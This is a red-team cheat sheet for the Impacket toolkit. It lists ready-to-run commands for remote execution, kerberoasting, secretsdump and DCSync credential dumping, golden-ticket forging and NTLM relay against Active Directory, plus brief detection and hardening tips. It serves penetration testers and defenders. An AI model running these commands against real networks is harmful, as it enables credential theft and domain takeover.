---
title: "Impacket – toolkit reference"
category: "red-team"
tags: ["tools", "active-directory", "impacket"]
platform: "windows"
mitre: ["T1021", "T1558", "T1003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Impacket

## TL;DR
A collection of Python scripts for Windows/AD protocols (SMB, MSRPC, Kerberos, LDAP). The backbone of AD pentesting from Linux. Most scripts accept `-hashes` (PtH) and `-k` (Kerberos).

## Remote execution
```bash
impacket-psexec corp.local/user:'Pass'@10.10.10.20     # service, loud
impacket-wmiexec corp.local/user:'Pass'@10.10.10.20    # quieter, no disk file
impacket-smbexec corp.local/user:'Pass'@10.10.10.20
impacket-atexec corp.local/user:'Pass'@10.10.10.20 whoami  # scheduled task
```

## Credentials / Kerberos
```bash
impacket-GetUserSPNs -request corp.local/user:'Pass' -dc-ip 10.10.10.10   # kerberoast
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass            # asreproast
impacket-secretsdump corp.local/administrator:'Pass'@10.10.10.20         # SAM/LSA/NTDS
impacket-secretsdump -just-dc corp.local/administrator@10.10.10.10 -hashes :<hash>  # DCSync
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-.. -domain corp.local admin   # golden
```

## SMB / relay / MSSQL
```bash
impacket-smbserver share ./ -smb2support           # host files
impacket-smbclient corp.local/user:'Pass'@10.10.10.20
impacket-ntlmrelayx -tf targets.txt -smb2support   # NTLM relay
impacket-mssqlclient corp.local/user:'Pass'@10.10.10.30 -windows-auth
```

## Auth flags (common)
```text
-hashes LM:NT   – pass-the-hash
-k -no-pass     – use Kerberos ticket from KRB5CCNAME
-dc-ip          – domain controller IP
```

## Detection (Blue Team)
- PSEXESVC service (7045), wmiprvse child processes, secretsdump = SAM/LSA/VSS access.
- ntlmrelayx: authentications relayed to other hosts — enforce SMB signing.

## Mitigation / Hardening
- SMB signing, LAPS, tiering, Kerberos AES, monitor DCSync (4662) and service creation.

## Sources
- [Impacket](https://github.com/fortra/impacket)
